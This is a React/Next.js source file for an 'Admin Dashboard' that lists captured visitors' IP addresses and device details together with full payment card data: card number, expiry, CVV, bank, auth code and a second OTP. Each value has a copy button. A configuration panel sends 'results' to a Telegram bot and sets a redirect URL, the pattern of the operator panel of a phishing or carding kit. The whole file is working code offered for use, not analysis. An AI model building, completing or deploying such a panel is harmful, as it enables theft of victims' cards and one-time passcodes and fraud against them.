'use client'

import React, { useState, useEffect } from 'react'
import { FaUsers, FaClipboardList, FaChevronDown, FaChevronUp, FaSignOutAlt, FaTrash, FaSave, FaCopy } from 'react-icons/fa'
import { useRouter } from 'next/navigation'
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"

interface CardData {
  id: number
  title: string
  value: number
  icon: React.ReactNode
}

interface Visitor {
  id: number
  name: string
  email: string
  visitTime: string
  browser: string
  os: string
}

interface Input {
  id: number
  type: string
  user: string
  email: string
  submitTime: string
  formData?: {
    name: string
    age: number
    occupation: string
  }
  content?: string
}

interface DatabaseData {
  visitors: Visitor[]
  inputs: Input[]
  counters: {
    visitors: number
    inputs: number
  }
}

// Add this interface for the IP address
interface VisitorWithIP extends Visitor {
  ipAddress: string
  userAgent: string
  device: string
  browser: string
  country: string
  visitTime: string
  cardDetails?: {
    cardHolder: string
    cardNumber: string
    expiryDate: string
    cvv: string
    bank: string
    authCode: string
    secondOTP: string
  }
}

interface DashboardProps {
  initialData: DatabaseData
}

const Dashboard: React.FC<DashboardProps> = ({ initialData }) => {
  const [expandedCard, setExpandedCard] = useState<number | null>(null)
  const [databaseData, setDatabaseData] = useState<DatabaseData>(initialData)
  const [sendToTelegram, setSendToTelegram] = useState(false)
  const [chatId, setChatId] = useState('')
  const [botId, setBotId] = useState('')
  const [redirectUrl, setRedirectUrl] = useState('')
  const router = useRouter()

  useEffect(() => {
    // Fetch config data
    fetch('/api/getConfig')
      .then(res => res.json())
      .then(data => {
        setSendToTelegram(data.sendResultToTelegram)
        setChatId(data.chatId || '')
        setBotId(data.botId || '')
        setRedirectUrl(data.redirectUrl || '')
      })
  }, [])

  const cardData: CardData[] = [
    { id: 1, title: 'Total Visitors', value: databaseData.counters?.visitors || 0, icon: <FaUsers /> },
    { id: 2, title: 'Total Inputs', value: databaseData.counters?.inputs || 0, icon: <FaClipboardList /> },
  ]

  const toggleCard = (id: number) => {
    setExpandedCard(expandedCard === id ? null : id)
  }

  const handleLogout = () => {
    localStorage.removeItem('isAdminAuthenticated')
    router.push('/admin')
  }

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString()
  }

  const clearDatabase = async () => {
    if (window.confirm('Are you sure you want to clear the database? This action cannot be undone.')) {
      const response = await fetch('/api/clearDatabase', { method: 'POST' })
      if (response.ok) {
        setDatabaseData({ visitors: [], inputs: [], counters: { visitors: 0, inputs: 0 } })
        alert('Database cleared successfully')
      } else {
        alert('Failed to clear database')
      }
    }
  }

  const saveConfig = async () => {
    const response = await fetch('/api/saveConfig', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sendToTelegram, chatId, botId, redirectUrl })
    })
    if (response.ok) {
      alert('Configuration saved successfully')
    } else {
      alert('Failed to save configuration')
    }
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      alert('Copied to clipboard!');
    }).catch(err => {
      console.error('Failed to copy: ', err);
    });
  };

  const renderDetailRow = (label: string, value: string) => (
    <div className="flex justify-between items-center py-1 text-xs sm:text-sm md:text-base">
      <span className="font-semibold">{label}:</span>
      <div className="flex items-center">
        <span className="mr-2 break-all">{value}</span>
        <FaCopy 
          className="cursor-pointer text-blue-500 hover:text-blue-700 text-xs sm:text-sm" 
          onClick={() => copyToClipboard(value)}
        />
      </div>
    </div>
  );

  return (
    <div className="p-2 sm:p-4 md:p-6 bg-gray-100 min-h-screen">
      <div className="bg-white p-3 sm:p-4 md:p-6 rounded-lg shadow-md mb-4 md:mb-6">
        <div className="flex justify-between items-center mb-2 md:mb-4">
          <h1 className="text-xl md:text-3xl font-bold text-black">Admin Dashboard</h1>
          <button
            onClick={handleLogout}
            className="bg-red-500 text-white py-1 px-2 md:py-2 md:px-4 rounded-md hover:bg-red-600 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2"
          >
            <FaSignOutAlt className="inline mr-1 md:mr-2" /> Logout
          </button>
        </div>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-2 md:gap-4 mb-2 md:mb-4">
          {cardData.map((card) => (
            <div key={card.id} className="bg-gray-100 p-2 sm:p-3 md:p-4 rounded-lg shadow-md">
              <div className="flex items-center justify-between mb-1 md:mb-2">
                <div className="flex items-center">
                  <span className="text-blue-500 mr-1 md:mr-2">{card.icon}</span>
                  <h2 className="text-sm md:text-lg font-semibold text-black">{card.title}</h2>
                </div>
              </div>
              <p className="text-lg md:text-2xl font-bold text-black">{card.value}</p>
            </div>
          ))}
        </div>

        <h2 className="text-xl md:text-2xl font-semibold mb-2 md:mb-4 text-black">Database Management</h2>
        <Button onClick={clearDatabase} className="mb-2 md:mb-4 bg-red-500 hover:bg-red-600">
          <FaTrash className="mr-1 md:mr-2" /> Clear Database
        </Button>

        <h2 className="text-xl md:text-2xl font-semibold mb-2 md:mb-4 text-black">Configuration</h2>
        <div className="space-y-2 md:space-y-4">
          <div className="flex items-center space-x-1 md:space-x-2">
            <input
              type="checkbox"
              id="telegram-toggle"
              checked={sendToTelegram}
              onChange={(e) => setSendToTelegram(e.target.checked)}
            />
            <Label htmlFor="telegram-toggle">Send results to Telegram bot</Label>
          </div>
          {sendToTelegram && (
            <>
              <Input
                placeholder="Chat ID"
                value={chatId}
                onChange={(e) => setChatId(e.target.value)}
              />
              <Input
                placeholder="Bot ID"
                value={botId}
                onChange={(e) => setBotId(e.target.value)}
              />
            </>
          )}
          <Input
            placeholder="Redirect URL"
            value={redirectUrl}
            onChange={(e) => setRedirectUrl(e.target.value)}
          />
          <Button onClick={saveConfig} className="bg-green-500 hover:bg-green-600">
            <FaSave className="mr-1 md:mr-2" /> Save Configuration
          </Button>
        </div>

        <h2 className="text-xl md:text-2xl font-semibold mb-2 md:mb-4 mt-4 md:mt-6 text-black">Recent Activity</h2>
        <div className="space-y-2 md:space-y-4">
          {(databaseData?.visitors as VisitorWithIP[])?.map((visitor) => (
            <div key={visitor.id} className="bg-gray-100 p-2 sm:p-3 md:p-4 rounded-lg shadow-md">
              <div 
                className="flex justify-between items-center cursor-pointer"
                onClick={() => toggleCard(visitor.id)}
              >
                <h3 className="text-xs sm:text-sm md:text-base font-semibold text-black">
                  Visitor IP: {visitor.ipAddress} | Bank Name: {visitor.cardDetails?.bank || 'N/A'} | Date: {formatDate(visitor.visitTime)}
                </h3>
                {expandedCard === visitor.id ? <FaChevronUp className="text-black text-xs sm:text-sm" /> : <FaChevronDown className="text-black text-xs sm:text-sm" />}
              </div>
              {expandedCard === visitor.id && (
                <div className="mt-2 md:mt-4 border-t pt-2 md:pt-4 text-black">
                  {renderDetailRow("IP Address", visitor.ipAddress)}
                  {renderDetailRow("User Agent", visitor.userAgent)}
                  {renderDetailRow("Device", visitor.device)}
                  {renderDetailRow("Browser", visitor.browser)}
                  {renderDetailRow("Country", visitor.country)}
                  {renderDetailRow("Visit Time", formatDate(visitor.visitTime))}
                  {visitor.cardDetails && (
                    <>
                      <h4 className="font-bold mt-2 mb-1 text-sm sm:text-base">Card Details:</h4>
                      {renderDetailRow("Card Holder", visitor.cardDetails.cardHolder)}
                      {renderDetailRow("Card Number", visitor.cardDetails.cardNumber)}
                      {renderDetailRow("Expiry Date", visitor.cardDetails.expiryDate)}
                      {renderDetailRow("CVV", visitor.cardDetails.cvv)}
                      {renderDetailRow("Bank", visitor.cardDetails.bank)}
                      {renderDetailRow("Auth Code", visitor.cardDetails.authCode)}
                      {renderDetailRow("Second OTP", visitor.cardDetails.secondOTP)}
                    </>
                  )}
                </div>
              )}
            </div>
          ))}
          {databaseData?.inputs.map((input) => (
            <div key={input.id} className="bg-gray-100 p-2 sm:p-3 md:p-4 rounded-lg shadow-md">
              <div 
                className="flex justify-between items-center cursor-pointer"
                onClick={() => toggleCard(input.id + 1000)}
              >
                <h3 className="text-sm sm:text-base md:text-lg font-semibold text-black">
                  Latest Input: {input.type} / {formatDate(input.submitTime)}
                </h3>
                {expandedCard === input.id + 1000 ? <FaChevronUp className="text-black text-xs sm:text-sm" /> : <FaChevronDown className="text-black text-xs sm:text-sm" />}
              </div>
              {expandedCard === input.id + 1000 && (
                <div className="mt-2 md:mt-4 border-t pt-2 md:pt-4 text-black">
                  <p><strong>User:</strong> {input.user}</p>
                  <p><strong>Email:</strong> {input.email}</p>
                  {input.formData && (
                    <div>
                      <p><strong>Form Data:</strong></p>
                      <ul className="list-disc list-inside">
                        <li>Name: {input.formData.name}</li>
                        <li>Age: {input.formData.age}</li>
                        <li>Occupation: {input.formData.occupation}</li>
                      </ul>
                    </div>
                  )}
                  {input.content && (
                    <p><strong>Content:</strong> {input.content}</p>
                  )}
                </div>
              )}
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}

export default Dashboard
